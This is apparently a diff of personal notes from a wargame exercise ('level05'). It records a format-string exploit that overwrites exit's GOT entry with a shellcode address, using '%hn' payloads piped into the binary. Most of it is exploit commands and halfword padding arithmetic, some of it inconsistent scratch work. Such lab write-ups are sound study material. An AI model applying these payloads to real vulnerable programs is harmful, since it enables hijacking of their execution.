@@ -2,18 +2,27 @@ format string spotted !
 
 python -c 'print("aaaa" + "%p " * 40)' | ./level05 = 10eme adresse
 
-addr of shellcode = 0x7fffffffe88f
+Nous sommes au 10eme offset
 
-addr exit = 080497e0 / in got 0x8048330
+==========================
+Addr exit = 0x080497e0
+0x0804	| 0x97e0
+ 2052	|  38880
+
+2052 - 12 = 2040
+38880 - 2052 = 36828
+==========================
+
+r <<< $(python -c 'print("aaaa" + "\xe2\x97\x04\x08\xe0\x97\x04\x08" + "%2040d%11$hn" + "%36828d%12$hn")')
+
+checkpoint : r <<< $(python -c 'print("aaaa" + "\xe2\x97\x04\x08\xe0\x97\x04\x08" + "%11$hn" + "%12$hn")')
 
 
-=====
-addr of shellcode = 0xffffe889
+============
+addr SHELLCODE = 0xffffd877
+0xffff	| 0xd877
+65535	|  55415
 
-decompose = 0xffff 0xe889
-
-0xffff = 65535 - 8 = 65527
-%35527d
-0xe889 = 55408 - 65527 = 49881
-%19881d
-=====
+55415 - 12 = 55403
+65535 - 55403 = 10132
+============
